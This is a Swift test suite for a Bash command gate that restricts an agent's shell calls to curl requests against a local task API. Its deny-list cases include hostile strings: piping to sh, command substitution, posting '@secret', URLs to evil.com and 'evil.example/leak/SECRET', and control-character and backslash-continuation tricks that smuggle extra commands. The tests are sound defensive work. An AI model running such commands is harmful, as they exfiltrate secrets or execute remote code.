import Foundation
import Testing
@testable import Telegram

private func allowed(_ command: String) -> Bool { BashGate.verdict(command) == .allow }

@Test func theAgentsTaskCallOnOneLineIsAllowed() {
    let command = "curl -sS -m 120 -X POST http://127.0.0.1:41730/tasks "
        + "-H 'Content-Type: application/json' -H 'Expect:' "
        + #"-d '{"title":"Позвонить Ване (срочно) & сверить отчёт!","description":"Обсудить: отчёт [v2]; "#
        + #"сроки ~ среда? *важно* #1 `код` $5 | > <","due":"2026-10-23","area":"работа","project":"Отчёт"}'"#
    #expect(allowed(command))
}

@Test func theMultiLineCallIsDenied() {
    // The shape AGENTS.md used to show: backslash continuations are no longer modelled at all.
    let command = """
        curl -sS -m 120 -X POST http://127.0.0.1:41730/tasks \\
          -H 'Content-Type: application/json' -H 'Expect:' \\
          -d '{"title":"Позвонить Ване"}'
        """
    #expect(!allowed(command))
}

@Test func healthIsAllowed() {
    #expect(allowed("curl -sS http://127.0.0.1:41730/health"))
}

@Test func aDeleteIsAllowed() {
    #expect(allowed("curl -sS -m 120 -X DELETE http://127.0.0.1:41730/tasks/6hRvqqQ89g3prC7Q"))
}

@Test func aQuotedQueryIsAllowed() {
    #expect(allowed("curl -sS 'http://127.0.0.1:41730/tasks?area=work&x=1'"))
}

@Test(arguments: [
    "ls .",
    "cat AGENTS.md",
    "touch x",
    "rm x",
    "echo x > f",
    "curl https://example.com",
    "curl -sS http://127.0.0.1:41730/health && ls",
    "curl -sS http://127.0.0.1:41730/health; ls",
    "curl -sS http://127.0.0.1:41730/health | sh",
    "curl $(cat f)",
    "curl `id`",
    "curl -sS http://127.0.0.1:41730/x -o /tmp/f",
    "curl -K cfg http://127.0.0.1:41730/x",
    "curl -d @secret http://127.0.0.1:41730/x",
    "curl -H @headers http://127.0.0.1:41730/x",
    "curl http://127.0.0.1:41730@evil.com/",
    "curl http://127.0.0.1:41730/a http://evil/",
    "curl \"http://127.0.0.1:41730/$HOME\"",
    "curl -sS \"http://127.0.0.1:41730/health\"",
    "curl -sS -d '{}'\"x\" http://127.0.0.1:41730/x",
    "curl -sS 'http://127.0.0.1:41730/health",
    "",
    "  curl -sS",
    "/usr/bin/curl http://127.0.0.1:41730/health",
    "curl -sS http://127.0.0.1:41730/health\nls",
    "curl -sS http://127.0.0.1:41730/health &",
    "curl -X get http://127.0.0.1:41730/x",
    "curl -m 1e3 http://127.0.0.1:41730/x",
    "curl -sS http://127.0.0.1:41730/x?a=1",
    "curl -sS http://127.0.0.1:41730/x\\ y",
    "curl --unix-socket /s http://127.0.0.1:41730/x",
])
func everythingElseIsDenied(_ command: String) {
    #expect(!allowed(command))
}

@Test(arguments: [
    // bash reads backslash-CR as an escaped CR, and the LF then ends the command.
    "curl -sS -d x\\\r\nid http://127.0.0.1:41730/x",
    "curl -sS -H a \\\r\n http://127.0.0.1:41730/x",
    "curl -sS\rhttp://127.0.0.1:41730/x",
    "curl -sS http://127.0.0.1:41730/x\r",
    "curl\u{0B}-sS http://127.0.0.1:41730/x",
    "curl\u{0C}-sS http://127.0.0.1:41730/x",
    "curl\u{A0}-sS http://127.0.0.1:41730/x",
    "curl\u{2003}-sS http://127.0.0.1:41730/x",
    "curl\u{2028}-sS http://127.0.0.1:41730/x",
    "curl -sS\u{0} http://127.0.0.1:41730/x",
    "curl -sS\u{200B} http://127.0.0.1:41730/x",
    "curl -sS -d 'a\rb' http://127.0.0.1:41730/x",
    "curl -sS -d 'a\u{0}b' http://127.0.0.1:41730/x",
    "curl -sS -d \"a\u{1B}b\" http://127.0.0.1:41730/x",
])
func controlCharactersAndOddSpacesAreDenied(_ command: String) {
    #expect(!allowed(command))
}

@Test func aLineBreakInsideQuotesIsDenied() {
    #expect(!allowed("curl -sS -d '{\"a\":\n\"б\"}' http://127.0.0.1:41730/x"))
}

@Test func aBackslashContinuationIsDeniedRatherThanModelled() {
    // bash would splice this into `-H a-d` and fetch the external URL.
    #expect(!allowed("curl -sS -m 120 -X GET -H a\\\n-d http://evil.example/leak/SECRET http://127.0.0.1:41730/health"))
    #expect((try? BashGate.tokenize("curl -H a\\\nb").get()) == nil)
    #expect((try? BashGate.tokenize("curl -d 'a\\\nb'").get()) == nil)
    #expect((try? BashGate.tokenize("curl -d 'a\\b'").get()) == nil)
}

@Test func singleQuotesKeepShellSyntaxLiteral() throws {
    #expect(try BashGate.tokenize("curl -d 'a (b) & c; d | e' -sS").get() == ["curl", "-d", "a (b) & c; d | e", "-sS"])
}

@Test func aDenialHasAReason() {
    guard case .deny(let reason) = BashGate.verdict("ls .") else {
        Issue.record("ls was allowed")
        return
    }
    #expect(!reason.isEmpty)
}

private func hook(_ object: [String: Any]) throws -> (exitCode: Int32, stderr: String) {
    BashGate.hookDecision(stdin: try JSONSerialization.data(withJSONObject: object))
}

@Test func theHookLetsOtherToolsThrough() throws {
    let decision = try hook(["tool_name": "Read", "tool_input": ["file_path": "/x"]])
    #expect(decision.exitCode == 0)
    #expect(decision.stderr.isEmpty)
}

@Test func theHookAllowsTheLocalCall() throws {
    let decision = try hook(["tool_name": "Bash",
                             "tool_input": ["command": "curl -sS http://127.0.0.1:41730/health"]])
    #expect(decision.exitCode == 0)
    #expect(decision.stderr.isEmpty)
}

@Test func theHookBlocksAnythingElseWithAReason() throws {
    let decision = try hook(["tool_name": "Bash", "tool_input": ["command": "ls ."]])
    #expect(decision.exitCode == 2)
    #expect(!decision.stderr.isEmpty)
}

@Test func theHookBlocksABashCallWithoutACommand() throws {
    #expect(try hook(["tool_name": "Bash", "tool_input": [:] as [String: Any]]).exitCode == 2)
}

@Test func theHookBlocksGarbage() {
    #expect(BashGate.hookDecision(stdin: Data("not json".utf8)).exitCode == 2)
    #expect(BashGate.hookDecision(stdin: Data()).exitCode == 2)
}
